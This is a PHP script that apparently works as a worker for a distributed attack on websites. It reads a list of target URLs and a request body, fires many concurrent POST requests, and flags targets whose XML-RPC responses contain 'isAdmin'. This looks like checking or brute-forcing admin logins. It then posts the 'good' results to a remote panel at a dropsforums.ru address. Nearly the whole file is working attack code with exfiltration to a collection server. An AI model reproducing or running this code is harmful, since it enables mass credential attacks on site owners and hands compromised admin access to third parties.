<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: text/html; charset=utf-8');
set_time_limit(900);
$begin_time = time() + floatval(microtime());
$hashcode = '7a3cb9bdfa';
echo 'W1'."\n";
$curl_result = array();
$p_threads = 10;
$p_delay = 1;
$link_timeout = 15;
$p_request = 2;
	if($p_request == '2') $p_request = 'post';
	else $p_request = 'get';
$requestbody_file = $_GET['requestbodyfile'];
$p_requestbody = file_get_contents($requestbody_file);
$p_regex = '<member><name>isAdmin</name><value><boolean>';
$p_regex_logic = 3;
$p_onlybody = 0;
$p_onlyheaders = 0;
$t_lfile = $_GET['lfile'];
$t_links = file_get_contents($t_lfile);
$all_links = explode('_||_',$t_links);
//$all_links = array_slice($all_links,6,10);
$all_links_o = $all_links;
$double_links = array();
	if($p_onlybody == '1') $onlybh = 1;
	if($p_onlyheaders == '1') $onlybh = 2;

$i = 1;
while(count($all_links) > 0)
{
	$links_part = array_splice($all_links, 0, $p_threads);
	$multithread = new MultiThread($link_timeout);
	$multithread->setLinks($links_part);
	$multithread->setMethod($p_request,$p_requestbody,$onlybh);
	$links_result = $multithread->execute();
	print_r($links_result);
	foreach($links_result as $res_el)
	{
		if(vf_regex($res_el['answer'],$p_regex,$p_regex_logic) === true)
		{
		$curl_result[$i] = $res_el['link'].'-||-good';
		}
		else
		{
		$curl_result[$i] = $res_el['link'].'-||-bad';
			if($res_el['linkerror'] == '2' || $res_el['linkerror'] == '3') $double_links[$i] = $all_links_o[($i-1)];
		}
	$i++;
	}
sleep($p_delay);
}
while(count($double_links) > 0)
{
	$links_part = array_slice($double_links, 0, $p_threads, true);
	$t_count = count($double_links) - $p_threads;
	$double_links = array_slice($double_links, $p_threads, $t_count, true);
	$multithread = new MultiThread($link_timeout, 1);
	$multithread->setLinks($links_part);
	$multithread->setMethod($p_request,$p_requestbody,$onlybh);
	$links_result = $multithread->execute();
	foreach($links_result as $res_el)
	{
		if(vf_regex($res_el['answer'],$p_regex,$p_regex_logic) === true) $curl_result[$res_el['lk']] = $res_el['link'].'-||-good';
		else $curl_result[$res_el['lk']] = $res_el['link'].'-||-bad';
	}
sleep($p_delay);
}
	print_r($curl_result);
	$curl_result = implode('_||_',$curl_result);
	$server_url = 'http://dropsforums.ru/panel/proc/receive_result.php';
	$result_init = curl_init($server_url);
	curl_setopt($result_init, CURLOPT_POST, true);
	curl_setopt($result_init, CURLOPT_TIMEOUT, 15);
	curl_setopt($result_init, CURLOPT_CONNECTTIMEOUT, 15);
	curl_setopt($result_init, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($result_init, CURLOPT_POSTFIELDS, array('hashcode' => $hashcode, 'client_id' => $p_client_id, 'proc_id' => $p_proc_id, 'vffsockopen' => $vffsockopen, 'result' => $curl_result));
	curl_exec($result_init);
	curl_close($result_init);
	
$end_time = time() + floatval(microtime()) - $begin_time;
echo "\n".'<br><b>Время выполнения: '.round($end_time,3).' секунд</b>';

class MultiThread
{
	private $maxthreads, $links = array(), $linkscount, $threads = array(), $mtype = 'get', $mcontent, $onlyBody = 0, $onlyHeaders = 0, $setonlyBody = 0, $results = array();
	public function __construct($link_timeout = 1, $double_req = 0, $maxthreads = 150)
	{
	$this->link_timeout = $link_timeout;
	$this->double_req = $double_req;
		if($this->double_req == 1)
		{
		$this->sock_timeout = 3;
		$this->link_timeout += 2;
		}
		else $this->sock_timeout = 2;
	$this->maxthreads = $maxthreads;
	}
    
	public function setLinks($links = array())
	{
	$this->links = $links;
	$this->linkscount = count($this->links);
		if($this->linkscount > $this->maxthreads) $this->links = array_slice($this->links, 0, $this->maxthreads);
	}
	
	public function setMethod($type,$mcontent='',$onlyBH=0)
	{
	$this->mtype = $type;
	$this->mcontent = $mcontent;
		if($onlyBH == 1) $this->onlyBody = '1';
		elseif($onlyBH == 2) $this->onlyHeaders = '1';
	}

	public function execute()
	{
	$li = 0;
	$t_redirects = array();
		foreach ($this->links as $lk => $link)
		{
		$li++;
		$this->results[$li] = array('link' => $link, 'lk' => $lk, 'answer' => '', 'linkerror' => '');
		$t_redirects[$li] = 0;
		$link_ar = parse_url($link);
			if(isset($link_ar['host']))
			{
			$server = $link_ar['host'];
				if(!$fsock = @fsockopen($server, 80, $erno, $erstr, $this->sock_timeout)) $this->results[$li]['linkerror'] = '2';
				else
				{
				$out = get_fwrite_data($link_ar,$this->mtype,$this->mcontent);
				fwrite($fsock, $out);
				stream_set_timeout($fsock, $this->link_timeout);
				stream_set_blocking($fsock, 0);
				$this->threads[$li] = $fsock;
				}
			}
			else $this->results[$li]['linkerror'] = '1';
		}
	$threads_start = time() + floatval(microtime());
		do
		{
			foreach ($this->threads as $key=>$value)
			{
			$threads_time = round((time() + floatval(microtime()) - $threads_start),2);
				if(feof($value) || $threads_time > ($this->link_timeout+8))
				{
				fclose($value); unset($this->threads[$key]);
				}
				else
				{
				$vf_timeout = stream_get_meta_data($value);
					if($vf_timeout['timed_out'] === true)
					{
					$this->results[$key]['linkerror'] = '3';
					fclose($value); unset($this->threads[$key]);
					continue;
					}
				//$t_answer = fgets($value);
				$t_answer = fread($value, 10240);
					if(!empty($t_answer))
					{
						if(stristr($t_answer,"location:")!='' && (stristr($t_answer,"301 Moved")!='' || stristr($t_answer,"301 Found")!='' || stristr($t_answer,"302 Found")!='' || stristr($t_answer,"302 Moved")!='' || stristr($t_answer,"302 Redirect")!='' || stristr($t_answer,"303 See")!='') && $t_redirects[$key]<3)
						{
						$link_redirect = preg_match('/^Location: (.+?)$/Um', $t_answer, $t_matches);
						$t_redirects[$key] += 1;
						$t_matches[1] = trim($t_matches[1]);
						echo $this->results[$key]['link'].' - '.$t_matches[1]."\n\n";
							if(substr($t_matches[1],0,5) == 'https')
							{
							$link_ar = parse_url($t_matches[1]);
							$server = $link_ar['host'];
								if(!$fsock = @fsockopen('ssl://'.$server, 443, $erno, $erstr, $this->sock_timeout))
								{
								$this->results[$key]['linkerror'] = '4';
								fclose($value); unset($this->threads[$key]);
								}
								else
								{
								$this->results[$key]['link'] = $t_matches[1];
								$out = get_fwrite_data($link_ar,$this->mtype,$this->mcontent);
								fwrite($fsock, $out);
								stream_set_timeout($fsock, $this->link_timeout);
								stream_set_blocking($fsock, 0);
								$this->threads[$key] = $fsock;
								$this->results[$key]['answer'] = '';
								continue;
								}
							}
							else
							{
								if(substr($t_matches[1],0,4) != 'http')
								{
								$link_ar = parse_url($this->results[$key]['link']);
								$server = $link_ar['host'];
								$t_matches[1] = 'http://'.$server.(substr($t_matches[1],0,1)=='/'?'':'/').$t_matches[1];
								}
							$link_ar = parse_url(trim($t_matches[1]));
							$server = $link_ar['host'];
							fclose($value); unset($this->threads[$key]);
								if(!$fsock = @fsockopen($server, 80, $erno, $erstr, $this->sock_timeout))
								{
								$this->results[$key]['linkerror'] = '5';
								}
								else
								{
								$this->results[$key]['link'] = $t_matches[1];
								$out = get_fwrite_data($link_ar,$this->mtype,$this->mcontent);
								fwrite($fsock, $out);
								stream_set_timeout($fsock, $this->link_timeout);
								stream_set_blocking($fsock, 0);
								$this->threads[$key] = $fsock;
								$this->results[$key]['answer'] = '';
								continue;
								}
							}
						}
					$this->results[$key]['answer'] .= $t_answer;
						if($this->onlyBody == 1 && $this->setonlyBody == 0)
						{
							if(strpos($this->results[$key]['answer'],"\r\n\r\n") !== false)
							{
							$body_ar = explode("\r\n\r\n",$this->results[$key]['answer'],2);
							$this->results[$key]['answer'] = $body_ar[1];
							$this->setonlyBody = 1;
							}
						}
						elseif($this->onlyHeaders == 1)
						{
							if(strpos($this->results[$key]['answer'],"\r\n\r\n") !== false)
							{
							$header_ar = explode("\r\n\r\n",$this->results[$key]['answer']);
							$this->results[$key]['answer'] = $header_ar[0];
							fclose($value); unset($this->threads[$key]);
							}
						}
					}
				}
			}
		usleep(10000);
		}
		while (count($this->threads) > 0);
    
	return $this->results;
    }
}

function get_fwrite_data($link_ar, $mtype='get', $content)
{
$server = $link_ar['host'];
$query = isset($link_ar['path']) ? $link_ar['path'] : '/';
	if(isset($link_ar['query'])) $query .= '?'.$link_ar['query'];
	if($mtype=='post')
	{
	$result = "POST $query HTTP/1.1\r\n";
	$result .= "Host: $server\r\n";
	$result .= "Cookie: income=1\r\n";
	$result .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$result .= "Content-Length: ".strlen($content)."\r\n";
	$result .= "Connection: Close\r\n\r\n";	
	$result .= $content;	
	}
	elseif($mtype=='get')
	{
	$result = "GET $query HTTP/1.1\r\n";
	$result .= "Host: $server\r\n";
	$result .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n";
	//$result .= "Accept: text/xml,application/xml,application/xhtml+xml,application/json,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
	//$result .= "Referer: http://armsites.info\r\n";
	$result .= "User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36\r\n";
	$result .= "Connection: Close\r\n\r\n";	
	}
return $result;
}

function vf_regex($answer, $regex, $regex_logic = 3)
{
	if($regex_logic == '3')
	{
	$regex = str_replace("\n",'',$regex);
	$answer = str_replace("\n",'',$answer);
		if(strpos($answer,$regex) !== false) return true;
	return false;
	}
	elseif($regex_logic == '1')
	{
		if(preg_match($regex,$answer)) return true;
	}
return false;
}
?>